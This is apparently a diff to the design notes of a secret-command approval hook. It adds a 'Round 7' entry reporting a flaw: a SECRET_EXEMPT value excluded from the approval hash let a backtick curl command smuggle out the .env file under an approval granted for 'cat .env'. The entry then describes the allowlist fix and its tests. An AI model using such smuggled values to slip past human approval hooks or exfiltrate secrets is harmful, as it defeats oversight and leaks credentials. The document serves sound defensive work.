@@ -909,6 +909,44 @@ may claim otherwise.
       was the round-4-to-round-5 framing in both this file and the module docstring and
       is no longer accurate.
 
+      **Round 7 (2026-08-31): excluding the value from the hash was safe only if the
+      value could not also smuggle in behaviour, and it could.** `canonical_text()`
+      strips one leading `SECRET_EXEMPT=<value>` prefix before hashing (round 4), which
+      correctly keeps a re-typed reason from wasting a grant -- but bash still EXECUTES
+      that value when the flagged command is re-run, and nothing anywhere checked what
+      the value contained. A backtick command substitution inside it therefore rode in on
+      an approval granted for the plain command it was attached to, because the id the
+      human inspected and the id the flagged re-run computed were IDENTICAL -- the value
+      was never part of either one. Measured, PRE-round-7:
+
+          fingerprint("cat .env")                                              = 648b13a0a3555ec5
+          fingerprint("SECRET_EXEMPT=`curl${IFS}-sd@.env${IFS}...` cat .env")   = 648b13a0a3555ec5   <- SAME
+
+      `grant()` for the plain form, then submit the backtick form: **allowed, and the
+      grant was consumed** -- an approval for `cat .env` cleared a command that
+      exfiltrates it. The `$( )` form of the same idea is refused today, but only by
+      accident: `unapprovable_reason()`'s multi-segment check fires because shlex splits
+      on the parens, not because anything inspected the value -- `is_approvable()` returns
+      `True` for the backtick form, and would for the `$( )` form too if that check were
+      ever removed or narrowed. **This is a refusal by accident, not a defence,** and
+      nothing in the pre-round-7 code or docs should be read as claiming otherwise.
+
+      Fixed by allowlisting the value in `unapprovable_reason()` rather than denylisting
+      dangerous characters: `^[A-Za-z0-9._,:/-]+$`, checked against the raw text
+      `canonical_text()` would strip (`leading_exempt_value()`, `secret_approval.py`).
+      Four prior rounds (4 through 6) each found one more character class or quoting
+      shape an enumeration had missed; this round does not extend that enumeration, it
+      inverts it -- naming what is allowed instead of what is refused. The value stays
+      excluded from the hash, unchanged from round 4; it is now also constrained so that
+      excluding it from identity is safe. A cleanly quoted, space-containing reason
+      (`SECRET_EXEMPT='a b'`) is refused too, not just a malformed one -- two existing
+      suite controls asserting such reasons "still strip cleanly" (true for the hash,
+      but no longer true for approvability) were inverted rather than left green and
+      silently contradicted by the new assertions. `hooks/secret-command-guard.test.sh`
+      grew from 149 passed / 0 failed to 160 passed / 0 failed; deleting the new check
+      alone reproduces exactly the same 10 assertions failing (150 passed / 10 failed) as
+      the pre-fix RED run, confirming the check is what discriminates.
+
 ## Decisions taken — user-confirmed 2026-08-28
 
 1. **`SECRET_EXEMPT` disables output redaction as well.** One flag clears both layers. A user
